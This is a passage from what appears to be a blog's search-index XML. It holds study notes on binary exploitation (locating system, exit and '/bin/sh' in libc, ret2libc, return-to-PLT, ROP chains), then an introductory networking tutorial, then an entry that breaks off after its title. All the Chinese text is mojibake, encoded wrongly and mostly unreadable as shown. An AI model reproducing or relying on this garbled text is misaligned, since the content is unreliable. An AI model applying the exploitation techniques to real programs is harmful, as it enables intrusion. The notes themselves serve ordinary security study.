åŠ¨æ€è°ƒè¯•ï¼šåœ¨gdbä¸­ç›´æŽ¥ç”¨printæ‰“å°systemå’Œexitå‡½æ•°åœ°å€ã€‚ é™æ€è°ƒè¯•ï¼šé¦–å…ˆç”¨lddå‘½ä»¤èŽ·å–libcåŸºåœ°å€ï¼Œç„¶åŽç”¨readelfå‘½ä»¤æ‰¾åˆ°systemå’Œexitå‡½æ•°åœ¨libcä¸­çš„åç§»ã€‚ç”¨stringså‘½ä»¤æ‰¾åˆ°å­—ç¬¦ä¸²ã€‚/bin/shåœ¨libcä¸­çš„åç§»ï¼Œæœ€åŽé€šè¿‡ä¸ŽlibcåŸºå€ç›¸åŠ æ¥èŽ·å¾—æœ€ç»ˆåœ°å€ã€‚ æƒ³äº†å¾ˆä¹…çš„çš„é—®é¢˜ï¼Œè‡ªå·±ç”¨è¯¾ä¸Šçš„ä¸‹æ–­ç‚¹è®¡ç®—æ–¹æ³•åŽ»åšé¢˜ï¼Œç»“æžœå’Œç­”æ¡ˆæœ‰4ä¸ªä½ç½®çš„å·®è·ï¼Œæƒ³äº†å¾ˆä¹…ï¼Œæƒ³æ˜Žç™½äº†è¿™ç§åœ¨è¾“å…¥çš„åœ°æ–¹ä¸‹æ–­ï¼Œå†åœ¨è¯¥å‡½æ•°retçš„åœ°æ–¹ä¸‹æ–­ï¼Œç”¨x/wx $ESPå¯ä»¥ç®—å‡ºåç§»é‡ã€‚è¿™æ˜¯åŒ…å«äº†ebpåœ¨å†…çš„ã€‚ä½†æ˜¯ç›´æŽ¥ç”¨IDAçœ‹çš„è¯ï¼Œsub-xxï¼Œè¿™ä¸ªxxæ˜¯ä¸åŒ…å«ebpåœ¨å†…çš„ã€‚ Return to libcåˆ©ç”¨lddï¼šçœ‹ä¸€ä¸ªç¨‹åºçš„åŠ¨æ€é“¾æŽ¥åº“åŠ è½½åˆ°äº†ä»€ä¹ˆåœ°å€ã€‚ strings -tx .soæ–‡ä»¶è·¯å¾„|grep strings readelf -s .soæ–‡ä»¶è·¯å¾„ |grep function nameï¼Œå¯ä»¥å¾—åˆ°å‡½æ•°åœ¨.soæ–‡ä»¶ä¸­çš„åç§»é‡ã€‚ç›¸åŠ å³å¾—åˆ°å‡†ç¡®åœ°å€ã€‚ ä¼ å‚çš„æ—¶å€™å¯èƒ½ä¼šç¢°åˆ°æŸäº›æƒ…å†µè¢«æˆªæ–­ï¼Œæ¯”å¦‚shåŽæœ‰ä¸ªå›žè½¦ï¼Œè¡¨çŽ°ä¸ºå¤šäº†ä¸ªaè¢«æˆªæ–­ï¼Œæ­¤æ—¶åªéœ€å†å¯»æ‰¾å­—ç¬¦ä¸²ã€‚ ROP:Return Oriented ProgrammingReturn to PLT:å¦‚æžœåŠ¨æ€å…±äº«åº“çš„åœ°å€éšæœºåŒ–ä¿æŠ¤å¼€å¯ï¼Œåˆ™æ— æ³•çŸ¥é“libcåœ°å€ã€‚è€Œç¨‹åºä¸­å·²ç»å¼•ç”¨çš„åŠ¨æ€åº“å‡½æ•°ï¼Œå¯ä»¥ç›´æŽ¥é€šè¿‡PLTè°ƒç”¨ï¼Œæ— éœ€çŸ¥é“å®žé™…åœ°å€ã€‚ ä»¥retæŒ‡ä»¤ç»“å°¾çš„å°æ®µä»£ç ç§°ä¸ºROP gadgetï¼Œå®žçŽ°æŸä¸€åŠŸèƒ½è€Œæ‹¼æŽ¥æˆå¤šä¸ªROP gadgetï¼Œç§°ä¸ºROPé“¾ã€‚åœ¨æ ˆä¸Šï¼Œä»Žè¿”å›žåœ°å€å¼€å§‹å¡«å……çš„ç”¨äºŽæ‰§è¡ŒROPçš„å‘½ä»¤ç§°ä¸ºROPè½½è·ROP payload. ä»¥æ­¤ç±»æŽ¨ï¼Œé™¤äº†å¯ä»¥åˆ©ç”¨Retï¼Œè¿˜å¯ä»¥åˆ©ç”¨Jmp/callæ¥æž„é€ è·³è½¬é“¾ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[Computer Networking Tutorial]]></title>
    <url>%2F2020%2F04%2F20%2FComputer-Networking-Tutorial%2F</url>
    <content type="text"><![CDATA[ä¸‰ç±»å¸¸è§çš„ç½‘ç»œï¼šç”µä¿¡ç½‘ç»œï¼Œæœ‰çº¿ç”µè§†ç½‘ç»œï¼Œè®¡ç®—æœºç½‘ç»œã€‚å‰ä¸¤è€…é€æ¸åœ¨å‘å±•è¿‡ç¨‹ä¸­èžåˆè¿›äº†è®¡ç®—æœºç½‘ç»œã€‚ è®¡ç®—æœºç½‘ç»œç”±è‹¥å¹²èŠ‚ç‚¹(node)å’Œé“¾æŽ¥è¿™äº›èŠ‚ç‚¹çš„(é“¾è·¯)ç»„æˆï¼Œç½‘ç»œèŠ‚ç‚¹å¯ä»¥æ˜¯è®¡ç®—æœºï¼Œé›†çº¿å™¨ï¼Œäº¤æ¢æœºæˆ–è·¯ç”±å™¨ç­‰ã€‚ åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€æœµäº‘è¡¨ç¤ºä¸€ä¸ªç½‘ç»œï¼Œå¯ä»¥ä¸ç”¨å…³å¿ƒç½‘ç»œä¸­ç›¸å½“å¤æ‚çš„ç»†èŠ‚é—®é¢˜ã€‚ç½‘ç»œä¹‹é—´è¿˜å¯ä»¥é€šè¿‡è·¯ç”±å™¨è¿žæŽ¥èµ·æ¥ï¼Œè¿™æž„æˆä¸€ä¸ªèŒƒå›´æ›´å¤§çš„ç½‘ç»œï¼Œäº’è¿žç½‘internetworkã€‚ æœ‰æ—¶ä¸ºäº†è®¨è®ºçš„æ–¹ä¾¿ï¼Œå¯ä»¥æŠŠæœ‰å…³çš„è®¡ç®—æœºç”»åœ¨äº‘çš„å¤–é¢ï¼Œä¹ æƒ¯ä¸Šå°†ä¸Žç½‘ç»œç›¸è¿žçš„è®¡ç®—æœºç§°ä¸ºä¸»æœºhostï¼Œè¿™æ ·ç”¨äº‘è¡¨ç¤ºçš„äº’è¿žç½‘é‡Œå°±åªå‰©ä¸‹è®¸å¤šè·¯ç”±å™¨å’Œè¿žæŽ¥è¿™äº›è·¯ç”±å™¨çš„é“¾è·¯äº†ã€‚ ç½‘ç»œæŠŠè®¸å¤šè®¡ç®—æœºè¿žåˆ°ä¸€èµ·ï¼Œäº’è¿žç½‘æŠŠè®¸å¤šç½‘ç»œé€šè¿‡è·¯ç”±å™¨è¿žåœ¨ä¸€èµ·ã€‚ä¸Žç½‘ç»œç›¸è¿žçš„è®¡ç®—æœºç§°ä¸ºä¸»æœºã€‚ internetä¸ŽInternetï¼šå‰è€…åªä¸€ä¸ªé€šç”¨åè¯ï¼Œæ³›æŒ‡ç”±å¤šä¸ªè®¡ç®—æœºç½‘ç»œäº’è¿žè€Œæˆçš„è®¡ç®—æœºç½‘ç»œã€‚è¿™äº›ç½‘ç»œä¹‹é—´çš„é€šä¿¡åè®®å¯ä»¥éšä¾¿é€‰æ‹©ï¼Œä¸ä¸€å®šTCP/IPã€‚åŽè€…ä¸“æŒ‡ç›®å‰å…¨çƒæœ€å¤§çš„æœ€å¼€æ”¾çš„ä¼—å¤šç½‘ç»œè¿žæŽ¥è€Œæˆçš„ç‰¹å®šäº’è¿žç½‘ï¼Œé‡‡ç”¨TCP/IPã€‚ã€ ISPï¼šInternet Service Providerï¼Œäº’è¿žç½‘æœåŠ¡æä¾›å•†ã€‚ISPä»Žäº’è¿žç½‘ç®¡ç†æœºæž„ç”³è¯·IPåœ°å€ï¼ŒåŒæ—¶æ‹¥æœ‰é€šä¿¡çº¿è·¯ã€‚ä¸Šç½‘æŒ‡çš„å°±æ˜¯é€šè¿‡ä»ŽISPèŽ·å¾—çš„IPåœ°å€æŽ¥å…¥åˆ°äº’è”ç½‘ã€‚ æ ¹æ®æä¾›æœåŠ¡çš„è¦†ç›–é¢ç§¯å¤§å°ä»¥åŠIPåœ°å€æ•°ç›®ï¼ŒISPåˆ†ä¸ºä¸»å¹²ISP(ä¸“é—¨å…¬å¸åˆ›å»ºï¼Œæ‹¥æœ‰é«˜é€Ÿä¸»å¹²ç½‘)ï¼Œåœ°åŒºISP(è¾ƒå°çš„ISPï¼Œé€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªä¸»å¹²ISPè¿žæŽ¥)ï¼Œæœ¬åœ°ISP(ç»™ç”¨æˆ·ç›´æŽ¥æä¾›æœåŠ¡ï¼Œå¯ä»¥æ˜¯æ‹¥æœ‰ç½‘ç»œå¹¶å‘è‡ªå·±é›‡å‘˜æä¾›æœåŠ¡çš„ä¼ä¸šï¼Œä¹Ÿå¯ä»¥æ˜¯å¦‚å¤§å­¦ç­‰è¿è¡Œè‡ªå·±ç½‘ç»œçš„éžè¥åˆ©æ€§æœºæž„ã€‚) IXPï¼šInternet eXchange Point:å…è®¸ä¸¤ä¸ªç½‘ç»œç›´æŽ¥è¿žæŽ¥å¹¶äº¤æ¢åˆ†ç»„ï¼Œæ¯”å¦‚ç›´æŽ¥è¿žæŽ¥ä¸¤ä¸ªåœ°åŒºISPã€‚å…¸åž‹çš„IXPç”±ä¸€ä¸ªæˆ–å¤šä¸ªç½‘ç»œäº¤æ¢æœºç»„æˆï¼Œè®¸å¤šISPå†è¿žæŽ¥åˆ°è¿™äº›ç½‘ç»œäº¤æ¢æœºçš„ç›¸å…³ç«¯å£ä¸Šã€‚ äº’è”ç½‘ä»Žå·¥ä½œæ–¹å¼ä¸Šçœ‹å¯ä»¥åˆ’åˆ†ä¸ºä»¥ä¸‹ä¸¤å¤§å—ï¼š è¾¹ç¼˜éƒ¨åˆ†ï¼šç”±æ‰€æœ‰è¿žæŽ¥åœ¨äº’è”ç½‘ä¸Šçš„ä¸»æœºç»„æˆï¼Œè¿™éƒ¨åˆ†æ—¶ç”¨æˆ·ç›´æŽ¥ä½¿ç”¨çš„ï¼Œç”¨æ¥è¿›è¡Œé€šä¿¡ä¸Žèµ„æºå…±äº«ã€‚ æ ¸å¿ƒéƒ¨åˆ†ï¼šç”±å¤§é‡ç½‘ç»œä»¥åŠè¿žæŽ¥è¿™äº›ç½‘ç»œçš„è·¯ç”±å™¨ç»„æˆï¼Œè¿™ä¸ªéƒ¨åˆ†ä¸ºè¾¹ç¼˜éƒ¨åˆ† æä¾›æœåŠ¡(è¿žé€šæ€§ä¸Žäº¤æ¢)ã€‚ è·¯ç”±å™¨ï¼šè¿žæŽ¥ä¸¤ä¸ªæˆ–å¤šä¸ªç½‘ç»œçš„ç¡¬ä»¶è®¾å¤‡ï¼Œåœ¨ç½‘ç»œé—´èµ·ç½‘å…³çš„ä½œç”¨ï¼Œæ˜¯è¯»å–æ¯ä¸€ä¸ªæ•°æ®åŒ…ä¸­çš„åœ°å€ç„¶åŽå†³å®šå¦‚ä½•ä¼ é€çš„ä¸“ç”¨æ™ºèƒ½æ€§çš„ç½‘ç»œè®¾å¤‡ã€‚å®ƒèƒ½å¤Ÿç†è§£ä¸åŒçš„åè®®ï¼Œä¾‹å¦‚æŸä¸ªå±€åŸŸç½‘ä½¿ç”¨çš„ä»¥å¤ªç½‘åè®®ï¼Œå› ç‰¹ç½‘ä½¿ç”¨çš„TCP/IPåè®®ã€‚è¿™æ ·ï¼Œè·¯ç”±å™¨å¯ä»¥åˆ†æžå„ç§ä¸åŒç±»åž‹ç½‘ç»œä¼ æ¥çš„æ•°æ®åŒ…çš„ç›®çš„åœ°å€ï¼ŒæŠŠéžTCP/IPç½‘ç»œçš„åœ°å€è½¬æ¢æˆTCP/IPåœ°å€ï¼Œæˆ–è€…åä¹‹ï¼›å†æ ¹æ®é€‰å®šçš„è·¯ç”±ç®—æ³•æŠŠå„æ•°æ®åŒ…æŒ‰æœ€ä½³è·¯çº¿ä¼ é€åˆ°æŒ‡å®šä½ç½®ã€‚æ‰€ä»¥è·¯ç”±å™¨å¯ä»¥æŠŠéžTCP/ IPç½‘ç»œè¿žæŽ¥åˆ°å› ç‰¹ç½‘ä¸Šã€‚ ç½‘å…³(Gateway)åˆç§°ç½‘é—´è¿žæŽ¥å™¨ã€åè®®è½¬æ¢å™¨ã€‚ç½‘å…³åœ¨ç½‘ç»œå±‚ä»¥ä¸Šå®žçŽ°ç½‘ç»œäº’è¿žï¼Œæ˜¯å¤æ‚çš„ç½‘ç»œäº’è¿žè®¾å¤‡ï¼Œä»…ç”¨äºŽä¸¤ä¸ªé«˜å±‚åè®®ä¸åŒçš„ç½‘ç»œäº’è¿žã€‚ç½‘å…³æ—¢å¯ä»¥ç”¨äºŽå¹¿åŸŸç½‘äº’è¿žï¼Œä¹Ÿå¯ä»¥ç”¨äºŽå±€åŸŸç½‘äº’è¿žã€‚ ç½‘å…³æ˜¯ä¸€ç§å……å½“è½¬æ¢é‡ä»»çš„è®¡ç®—æœºç³»ç»Ÿæˆ–è®¾å¤‡ã€‚ä½¿ç”¨åœ¨ä¸åŒçš„é€šä¿¡åè®®ã€æ•°æ®æ ¼å¼æˆ–è¯­è¨€ï¼Œç”šè‡³ä½“ç³»ç»“æž„å®Œå…¨ä¸åŒçš„ä¸¤ç§ç³»ç»Ÿä¹‹é—´ï¼Œç½‘å…³æ˜¯ä¸€ä¸ªç¿»è¯‘å™¨ã€‚ä¸Žç½‘æ¡¥åªæ˜¯ç®€å•åœ°ä¼ è¾¾ä¿¡æ¯ä¸åŒï¼Œç½‘å…³å¯¹æ”¶åˆ°çš„ä¿¡æ¯è¦é‡æ–°æ‰“åŒ…ï¼Œä»¥é€‚åº”ç›®çš„ç³»ç»Ÿçš„éœ€æ±‚ã€‚ ç½‘æ¡¥æ˜¯ä¸€ç§å¯¹å¸§è¿›è¡Œè½¬å‘çš„æŠ€æœ¯ï¼Œæ ¹æ®MACåˆ†åŒºå—ï¼Œå¯éš”ç¦»ç¢°æ’žã€‚ç½‘æ¡¥å°†ç½‘ç»œçš„å¤šä¸ªç½‘æ®µåœ¨æ•°æ®é“¾è·¯å±‚è¿žæŽ¥èµ·æ¥ã€‚ä¹Ÿå«æ¡¥æŽ¥å™¨ï¼Œæ˜¯è¿žæŽ¥ä¸¤ä¸ªå±€åŸŸç½‘çš„ä¸€ç§å­˜å‚¨/è½¬å‘è®¾å¤‡ï¼Œå®ƒèƒ½å°†ä¸€ä¸ªå¤§çš„LANåˆ†å‰²ä¸ºå¤šä¸ªç½‘æ®µï¼Œæˆ–å°†ä¸¤ä¸ªä»¥ä¸Šçš„LANäº’è”ä¸ºä¸€ä¸ªé€»è¾‘LANï¼Œä½¿LANä¸Šçš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯è®¿é—®æœåŠ¡å™¨ã€‚ ç½‘æ®µï¼ˆnetwork segmentï¼‰ä¸€èˆ¬æŒ‡ä¸€ä¸ªè®¡ç®—æœºç½‘ç»œä¸­ä½¿ç”¨åŒä¸€ç‰©ç†å±‚è®¾å¤‡ï¼ˆä¼ è¾“ä»‹è´¨ï¼Œä¸­ç»§å™¨ï¼Œé›†çº¿å™¨ç­‰ï¼‰èƒ½å¤Ÿç›´æŽ¥é€šè®¯çš„é‚£ä¸€éƒ¨åˆ†ã€‚ è¿›ç¨‹ï¼šè¿è¡Œç€çš„ç¨‹åºã€‚ åœ¨ç½‘ç»œè¾¹ç¼˜çš„ç«¯ç³»ç»Ÿä¹‹é—´çš„é€šä¿¡æ–¹å¼é€šå¸¸åˆ†ä¸ºä¸¤å¤§ç±»ï¼šå®¢æˆ·-æœåŠ¡å™¨(C/S)æ–¹å¼ï¼Œå¯¹ç­‰æ–¹å¼(P2P)ã€‚ å®¢æˆ·-æœåŠ¡å™¨æ–¹å¼:æœ€å¸¸ç”¨ï¼Œæœ€ä¼ ç»Ÿçš„æ–¹å¼ã€‚å®¢æˆ·å’ŒæœåŠ¡å™¨éƒ½æ˜¯æŒ‡é€šä¿¡ä¸­æ‰€æ¶‰åŠçš„ä¸¤ä¸ªåº”ç”¨è¿›ç¨‹ï¼Œéƒ½è¦ä½¿ç”¨ç½‘ç»œæ ¸å¿ƒéƒ¨åˆ†æ‰€æä¾›çš„æœåŠ¡ã€‚ å®¢æˆ·ç¨‹åºï¼šè¢«ç”¨æˆ·è°ƒç”¨åŽè¿è¡Œï¼Œåœ¨é€šä¿¡æ—¶ä¸»åŠ¨å‘åŽŸåœ°æœåŠ¡å™¨å‘èµ·è¯·æ±‚æœåŠ¡ï¼Œå› æ­¤å®¢æˆ·ç¨‹åºå¿…é¡»çŸ¥é“æœåŠ¡å™¨ç¨‹åºçš„åœ°å€ã€‚ä¸éœ€è¦ç‰¹æ®Šç¡¬ä»¶ã€‚å¤æ‚æ“ä½œç³»ç»Ÿã€‚ æœåŠ¡å™¨ç¨‹åºï¼šä¸€ç§ä¸“é—¨ç”¨æ¥æä¾›æŸç§æœåŠ¡çš„ç¨‹åºï¼Œå¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªè¯·æ±‚ã€‚ç³»ç»Ÿå¯åŠ¨åŽå³è‡ªåŠ¨è°ƒç”¨å¹¶ä¸æ–­è¿è¡Œã€‚è¢«åŠ¨æŽ¥å—è¯·æ±‚ï¼Œä¸çŸ¥é“å®¢æˆ·ç«¯åœ°å€ã€‚ä¸€èˆ¬æ‹¥æœ‰å¼ºå¤§è€Œç¡¬ä»¶å’Œé«˜çº§æ“ä½œç³»ç»Ÿæ”¯æŒã€‚ è¡¡é‡è®¡ç®—æœºç½‘ç»œæ€§èƒ½çš„ä¸ƒä¸ªæŒ‡æ ‡ï¼š é€ŸçŽ‡ï¼šè®¡ç®—æœºå‘å‡ºçš„ä¿¡å·éƒ½æ˜¯æ•°å­—å½¢å¼çš„ã€‚æ¯”ç‰¹çš„æ„æ€æ˜¯ä¸€ä¸ªâ€œäºŒè¿›åˆ¶æ•°å­—â€ï¼Œæ˜¯ä¿¡æ¯è®ºä¸­ä½¿ç”¨çš„ä¿¡æ¯é‡çš„å•ä½ã€‚ç½‘ç»œæŠ€æœ¯ä¸­çš„é€ŸçŽ‡æŒ‡çš„æ˜¯æ•°å­—ä¼ é€é€ŸçŽ‡ï¼Œä¹Ÿç§°ä¸ºæ•°æ®çŽ‡æˆ–æ¯”ç‰¹çŽ‡ã€‚ å¸¦å®½bandwidthï¼šæŒ‡æŸä¸ªä¿¡å·å…·æœ‰çš„é¢‘å¸¦å®½åº¦ã€‚ä¿¡å·çš„å¸¦å®½æ˜¯æŒ‡è¯¥ä¿¡å·æ‰€åŒ…å«çš„å„ç§ä¸åŒé¢‘çŽ‡æ‰€å æ®çš„é¢‘çŽ‡èŒƒå›´ã€‚è¿™ç§æ„ä¹‰çš„å¸¦å®½çš„å•ä½æ˜¯èµ«ã€‚åœ¨è¿‡åŽ»å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œé€šä¿¡ä¸»å¹²çº¿ä¼ é€çš„æ˜¯æ¨¡æ‹Ÿä¿¡å·ï¼ˆè¿žç»­å˜åŒ–çš„ä¿¡å·ï¼‰ï¼Œå› æ­¤è¡¨ç¤ºæŸä¿¡é“å…è®¸é€šè¿‡çš„ä¿¡å·é¢‘å¸¦èŒƒå›´å°±ç§°ä¹‹ä¸ºè¯¥ä¿¡é“çš„å¸¦å®½ã€‚|åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œå¸¦å®½ç”¨æ¥è¡¨ç¤ºç½‘ç»œä¸­æŸé€šé“ä¼ é€æ•°æ®çš„èƒ½åŠ›ï¼Œå› æ­¤ç½‘ç»œå¸¦å®½è¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…ç½‘ç»œä¸­çš„æŸä¿¡é“æ‰€èƒ½é€šè¿‡çš„â€œæœ€é«˜æ•°æ®çŽ‡â€ã€‚è¿™ç§æ„ä¹‰å¸¦å®½çš„å•ä½å°±æ˜¯æ•°æ®çŽ‡çš„å•ä½bit/sã€‚å‰è€…ä¸ºé¢‘åŸŸç§°è°“ï¼ŒåŽè€…ä¸ºæ—¶åŸŸç§°è°“ã€‚ åžåé‡throughputè¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œçš„å®žé™…æ•°æ®é‡ã€‚æ›´ç»å¸¸åœ°ç”¨äºŽå¯¹çŽ°å®žä¸–ç•Œä¸­çš„ç½‘ç»œçš„ä¸€ç§æµ‹é‡ã€‚ æ—¶å»¶delayæ˜¯æŒ‡æ•°æ®ä»Žç½‘ç»œæˆ–é“¾è·¯çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€çš„æ—¶é—´ï¼Œç”±å‘é€æ—¶å»¶ï¼Œä¼ æ’­æ—¶å»¶ï¼Œå¤„ç†æ—¶å»¶ä»¥åŠæŽ’é˜Ÿæ—¶å»¶ç»„æˆã€‚å‘é€æ—¶å»¶æ˜¯ä¸»æœºæˆ–è€…è·¯ç”±å™¨å‘é€æ•°æ®å¸§æ‰€éœ€è¦çš„æ—¶é—´ï¼Œä¹Ÿå°±æ˜¯ä»Žå‘é€æ•°æ®å¸§çš„ç¬¬ä¸€ä¸ªbitç®—èµ·ï¼Œåˆ°å…¨éƒ¨å‘å®Œæ‰€éœ€çš„æ—¶é—´ã€‚ä¼ æ’­æ—¶å»¶ï¼šæ˜¯ç”µç£æ³¢åœ¨ä¿¡é“ä¸­ä¼ æ’­ä¸€å®šçš„è·ç¦»éœ€è¦èŠ±è´¹çš„æ—¶é—´ã€‚å¤„ç†æ—¶å»¶ï¼šä¸»æœºæˆ–è€…è·¯ç”±å™¨åœ¨æ”¶åˆ°åˆ†ç»„æ—¶èŠ±è´¹ä¸€å®šçš„æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä»Žè€Œäº§ç”Ÿçš„æ—¶å»¶ã€‚æŽ’é˜Ÿæ—¶å»¶ï¼šåˆ†ç»„åœ¨ç»è¿‡ç½‘ç»œä¼ è¾“æ—¶ï¼Œè¦ç»è¿‡å¾ˆå¤šè·¯ç”±å™¨ã€‚è¿›å…¥è·¯ç”±å™¨çš„æ—¶å€™è¦çŽ°åœ¨è¾“å…¥é˜Ÿåˆ—ä¸­æŽ’é˜Ÿç­‰å¾…å¤„ç†ã€‚ç¡®å®šè½¬å‘æŽ¥å£å‘¨è¿˜è¦åœ¨è¾“å‡ºé˜Ÿåˆ—ä¸­æŽ’é˜Ÿç­‰å¾…è½¬å‘ã€‚æŽ’é˜Ÿæ—¶å»¶å–å†³äºŽç½‘ç»œå½“æ—¶çš„é€šä¿¡é‡ã€‚å…¶ç‰¹åˆ«å¤§çš„æ—¶å€™è¿˜ä¼šå¯¼è‡´é˜Ÿåˆ—æº¢å‡ºï¼Œåˆ†ç»„ä¸¢å¤±ã€‚ åœ¨è®¡ç®—æœºç½‘ç»œä¸­è¦åšåˆ°æœ‰æ¡ä¸ç´Šåœ°äº¤æ¢æ•°æ®ï¼Œå°±å¿…é¡»éµå®ˆäº‹å…ˆçº¦å®šçš„è§„åˆ™ï¼Œè¿™äº›è§„åˆ™æ˜Žç¡®è§„å®šäº†æ‰€è¦äº¤æ¢çš„æ•°æ®åœ°æ ¼å¼ä»¥åŠåŒæ­¥é—®é¢˜ã€‚è¿™äº›ä¸ºè¿›è¡Œç½‘ç»œä¸­çš„æ•°æ®äº¤æ¢è€Œå»ºç«‹çš„è§„åˆ™ï¼Œæ ‡å‡†æˆ–è€…çº¦å®šç§°ä¸ºç½‘ç»œåè®®ã€‚ ç½‘ç»œåè®®çš„ç»„æˆï¼šè¯­æ³•ï¼Œæ•°æ®ä¸ŽæŽ§åˆ¶ä¿¡æ¯çš„ç»“æž„æˆ–è€…æ ¼å¼ã€‚è¯­ä¹‰ï¼Œéœ€è¦å‘å‡ºä½•ç§æŽ§åˆ¶ä¿¡æ¯ï¼Œå®Œæˆä½•ç§åŠ¨ä½œï¼Œä½œå‡ºä½•ç§å“åº”ã€‚åŒæ­¥ï¼Œäº‹ä»¶å®žçŽ°é¡ºåºçš„è¯¦ç»†è¯´æ˜Žã€‚ ![QQå›¾ç‰‡20200302164850](D:\My Daily\P\QQå›¾ç‰‡20200302164850.png) è®¡ç®—æœºç½‘ç»œå°±æ˜¯å­¦ä¹ åè®®çš„ä½“ç³»ç»“æž„ã€‚ä¸‹å±‚å‘ä¸Šå±‚æä¾›æœåŠ¡ã€‚ åº”ç”¨å±‚ï¼ˆapplication layer)ï¼šåº”ç”¨å±‚æ˜¯ä½“ç³»ç»“æž„ä¸­çš„æœ€é«˜å±‚ã€‚åº”ç”¨å±‚çš„ä»»åŠ¡æ˜¯é€šè¿‡åº”ç”¨è¿›ç¨‹é—´çš„äº¤äº’æ¥å®Œæˆç‰¹å®šçš„ç½‘ç»œåº”ç”¨ã€‚åº”ç”¨å±‚åè®®å®šä¹‰çš„æ˜¯åº”ç”¨è¿›ç¨‹ä¹‹é—´é€šä¿¡å’Œäº¤äº’çš„è§„åˆ™ã€‚è¿™é‡Œçš„è¿›ç¨‹å°±æ˜¯æŒ‡ä¸»æœºä¸­æ­£åœ¨è¿è¡Œçš„ç¨‹åºã€‚åº”ç”¨å±‚äº¤äº’çš„æ•°æ®å•å…ƒç§°ä¸ºæŠ¥æ–‡ï¼ˆmessageï¼‰ã€‚ è¿è¾“å±‚ï¼ˆtransport layerï¼‰ï¼šè¿è¾“å±‚çš„ä»»åŠ¡å°±æ˜¯è´Ÿè´£å‘ä¸¤å°ä¸»æœºä¸­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æä¾›é€šç”¨çš„æ•°æ®ä¼ è¾“æœåŠ¡ã€‚å¤šç§åº”ç”¨å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸€ä¸ªè¿è¾“å±‚æœåŠ¡ã€‚è¿è¾“å±‚æœ‰åˆ†ç”¨å’Œå¤ç”¨çš„åŠŸèƒ½ï¼Œå¤ç”¨å°±æ˜¯å¤šä¸ªåº”ç”¨å±‚è¿›ç¨‹å¯ä»¥åŒæ—¶ä½¿ç”¨ä¸‹é¢è¿è¾“å±‚çš„æœåŠ¡ã€‚åˆ†ç”¨åˆ™æ˜¯è¿è¾“å±‚æŠŠæ”¶åˆ°çš„ä¿¡æ¯åˆ†åˆ«äº¤ä»˜ä¸Šé¢åº”ç”¨å±‚ä¸­çš„ç›¸åº”è¿›ç¨‹ã€‚è¿è¾“å±‚ä¸»è¦ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§åè®®ï¼šä¼ è¾“æŽ§åˆ¶åè®®TCPï¼ˆTransmission Control Protocolï¼‰æä¾›é¢å‘è¿žæŽ¥çš„ï¼Œå¯é çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œå…¶æ•°æ®ä¼ è¾“çš„å•ä½æ˜¯æŠ¥æ–‡æ®µï¼ˆsegmentï¼‰ã€‚ç”¨æˆ·æ•°æ®åè®®UDPï¼ˆUser Datagram Protocolï¼‰æä¾›æ— è¿žæŽ¥çš„ï¼Œå°½æœ€å¤§åŠªåŠ›best-effortçš„æ•°æ®ä¼ è¾“æœåŠ¡ã€‚å…¶ä¼ è¾“çš„å•ä½æ˜¯ç”¨æˆ·æ•°æ®æŠ¥ã€‚ ç½‘ç»œå±‚ï¼ˆnetwork layerï¼‰ï¼šç½‘ç»œå±‚è´Ÿè´£ä¸ºåˆ†ç»„äº¤æ¢ç½‘ä¸Šçš„ä¸åŒä¸»æœºæä¾›é€šä¿¡æœåŠ¡ã€‚åœ¨å‘é€æ•°æ®æ—¶ï¼Œç½‘ç»œå±‚æŠŠè¿è¾“å±‚äº§ç”Ÿçš„æŠ¥æ–‡æ®µæˆ–ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„æˆ–åŒ…è¿›è¡Œä¼ é€ã€‚å³åˆ†ç»„äº¤æ¢ã€‚åœ¨TCP/IPä½“ç³»ä¸­ï¼Œç”±äºŽç½‘ç»œå±‚ä½¿ç”¨IPåè®®ï¼Œå› æ­¤åˆ†ç»„ä¹Ÿå«åšIPæ•°æ®æŠ¥ã€‚ç½‘ç»œå±‚çš„å¦ä¸€ä¸ªä»»åŠ¡å°±æ˜¯è¦é€‰æ‹©åˆé€‚çš„è·¯ç”±ï¼Œä½¿æºä¸»æœºè¿è¾“å±‚æ‰€ä¼ ä¸‹æ¥çš„åˆ†ç»„ï¼Œèƒ½å¤Ÿé€šè¿‡ç½‘ç»œï¼ˆä¸“æŒ‡ç¬¬ä¸‰å±‚ï¼Œéžæ™®é€šç½‘ç»œï¼‰ä¸­çš„è·¯ç”±å™¨æ‰¾åˆ°ç›®çš„ä¸»æœºã€‚äº’è”ç½‘æ˜¯ç”±å¤§é‡çš„å¼‚æž„ç½‘ç»œé€šè¿‡è·¯ç”±å™¨ï¼ˆruterï¼‰ç›¸äº’è¿žæŽ¥èµ·æ¥çš„ã€‚äº’è”ç½‘ä½¿ç”¨çš„ç½‘ç»œå±‚åè®®æ˜¯æ— è¿žæŽ¥çš„ç½‘é™…åè®®IPå’Œè®¸å¤šç§è·¯ç”±é€‰æ‹©åè®®ã€‚å› æ­¤äº’è”ç½‘çš„ç½‘ç»œå±‚ä¹Ÿå«åšç½‘é™…å±‚æˆ–IPå±‚ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[é•¿äº­å…¬å¼€è¯¾-äºŒè¿›åˆ¶ç¨‹åºåŸºç¡€åŽŸç†å…¥é—¨]]></title>
    <url>%2F2020%2F04%2F14%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE-%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E5%85%A5%E9%97%A8%2F</url>
